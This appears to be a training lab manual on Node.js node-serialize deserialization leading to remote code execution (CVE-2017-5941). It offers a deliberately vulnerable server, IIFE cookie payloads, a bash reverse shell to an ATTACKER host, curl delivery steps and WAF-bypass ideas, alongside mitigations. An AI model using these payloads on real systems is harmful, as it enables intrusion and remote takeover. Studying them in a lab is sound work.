## Docker lab

Preferred setup: `cd labs && ./labctl.sh up` (see [`lab/README.md`](lab/README.md) and [`labs/README.md`](../../labs/README.md)).

---

# Node.js Deserialization (node-serialize) — Lab Manual

## Vulnerability summary

| Item | Detail |
|------|--------|
| Target class | Node.js apps using **node-serialize** (or similar) |
| Reference CVE | CVE-2017-5941 (node-serialize) |
| Type | Insecure deserialization → RCE |
| Impact | Arbitrary JS in server process → `child_process` → OS command exec |
| PoC | `poc.py` in this directory |
| Case study | `notes/NODEJS-DESERIALIZATION.md` |

---

## Root cause

`node-serialize` supports serializing functions via a special marker:

```text
_$$ND_FUNC$$_
```

On `unserialize()`, function bodies are restored with an `eval`-like path. An attacker supplies an **IIFE** (immediately invoked function expression) so code runs at deserialize time:

```text
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('id', ...) }()"}
```

### Vulnerable pattern

```javascript
var serialize = require('node-serialize');
// cookie or body holds attacker JSON
var obj = serialize.unserialize(userControlledString);
```

### Secure direction

- Never unserialize untrusted data with `node-serialize`.
- Prefer JSON.parse with schema validation and no function revival.
- Avoid `eval`, `new Function`, `vm.runInThisContext` on user input (see Bassmaster case).

---

## Attack chain

1. Find serialized object transport (cookie, hidden field, API body, session store).
2. Confirm `node-serialize` / function markers in source or `package.json`.
3. Build IIFE payload executing `child_process.exec` / `execSync` / `spawn`.
4. Deliver; verify via sleep, ping, HTTP callback, or in-band response.
5. Upgrade to reverse shell or read flags from disk.

```text
Attacker cookie → unserialize() → IIFE runs → child_process → RCE
```

---

## Lab setup

### Minimal vulnerable server (conceptual)

```javascript
// lab-only sketch
const http = require('http');
const serialize = require('node-serialize');
const cookie = require('cookie'); // or manual parse

http.createServer((req, res) => {
  const cookies = cookie.parse(req.headers.cookie || '');
  if (cookies.profile) {
    try {
      const profile = serialize.unserialize(cookies.profile);
      res.end('Hello ' + (profile.username || 'guest'));
    } catch (e) {
      res.end('err');
    }
  } else {
    // set benign serialized profile
    const benign = serialize.serialize({ username: 'guest' });
    res.setHeader('Set-Cookie', 'profile=' + encodeURIComponent(benign));
    res.end('cookie set');
  }
}).listen(3000);
```

```bash
npm init -y
npm install node-serialize@0.0.4
node server.js
```

### Docker-ish notes

- Node 14–18 fine for this class of lab
- Expose port 3000; attack from host network

### HTB-style practice

- **Celestial** (Node deserial themes) — see README HTB table

---

## Payload construction

### IIFE skeleton

```javascript
_$$ND_FUNC$$_function(){
  // attacker code
}()
```

### Command execution examples

```javascript
// fire-and-forget
require('child_process').exec('ping -c 3 ATTACKER')

// reverse shell (bash)
require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"')
```

### Full cookie value shape

Often a JSON object with one malicious property:

```json
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

URL-encode when placing in Cookie header.

### Encoding tips

- Prefer single quotes inside payload if JSON uses double quotes (escape carefully)
- Base64-wrap commands if quoting hell appears: `Buffer` + `bash -c` patterns
- Test locally with a one-liner `unserialize` before sending

---

## Manual exploitation walkthrough

### 1. Recon

```bash
curl -i http://TARGET:3000/
# inspect Set-Cookie, package.json if source given
grep -R "node-serialize\|unserialize\|ND_FUNC" -n .
```

### 2. Build payload

```bash
# use PoC or craft manually
python3 -c 'import urllib.parse; print(urllib.parse.quote(payload))'
```

### 3. Deliver

```bash
curl -i http://TARGET:3000/ \
  -H 'Cookie: profile=ENCODED_PAYLOAD'
```

### 4. Verify

- ICMP: tcpdump/icmp on attacker
- HTTP: `python3 -m http.server` + `curl attacker` in payload
- Shell: `nc -lvnp 4444`

---

## Using this directory's PoC

```bash
python3 poc.py --help
python3 poc.py 192.168.1.10 3000 10.10.14.5 4444
# with proxy if supported by script flags — check argparse in poc.py
```

Expected stages: recon → generate payload → deliver → verify listener.

---

## Code review checklist (Node)

- [ ] `package.json` dependencies: node-serialize, serialize-javascript misuse, crockford-style serializers with functions
- [ ] `unserialize(` / `serialize.unserialize`
- [ ] `eval(`, `new Function(`, `vm.runIn`
- [ ] Session middleware storing complex objects client-side
- [ ] Template engines with server-side evaluation of user input (SSTI crossover)

---

## Bypasses & variations

| Situation | Idea |
|-----------|------|
| WAF strips `child_process` | Dynamic require construction, alternate APIs |
| No egress | Write file under static path; hit via HTTP |
| Only `spawn` allowed in mental model | Same impact |
| Different library | Still hunt function revival / eval of JSON fields |
| Bassmaster-like batch `$apply` | See `poc-examples/bassmaster-js-injection/` — not deserial but same RCE end state |

---

## Debugging

| Symptom | Checks |
|---------|--------|
| No execution | Encoding wrong; IIFE parentheses missing; cookie name wrong |
| 400/500 | JSON syntax; quote escaping |
| Exec but no shell | Firewall egress; wrong LHOST; use callback first |
| Works in Node REPL not in app | Different code path; not all routes unserialize |

---

## OSWE exam notes

- **Time box**: finding `unserialize` in source is faster than fuzzing cookies blindly.
- Celestial-style boxes train the IIFE idea — script delivery immediately after confirm.
- Node RCE often yields env vars (secrets, DB URLs) for chaining.
- Distinguish **prototype pollution** (different class) from **deserialize IIFE**.
- Report: show package dependency + unserialize sink + callback proof.

### Suggested stage timing

| Stage | Minutes |
|-------|---------|
| Find sink | 10 |
| Craft IIFE | 5 |
| Verify OOB | 5 |
| Shell + PoC polish | 20–40 |

---

## Mitigation (for findings section)

1. Remove `node-serialize`; use JSON only.
2. Never restore functions from user data.
3. HttpOnly cookies with opaque session IDs.
4. Least privilege OS user for Node process.
5. Egress filtering (limits impact, not root cause).

---

## References

- OpsecX write-up: exploiting Node.js deserialization for RCE
- CVE-2017-5941
- HTB Celestial write-ups (README)
- `notes/NODEJS-DESERIALIZATION.md`
- Related: `notes/BASSMASTER-1.5.1-JS-INJECTION.md`
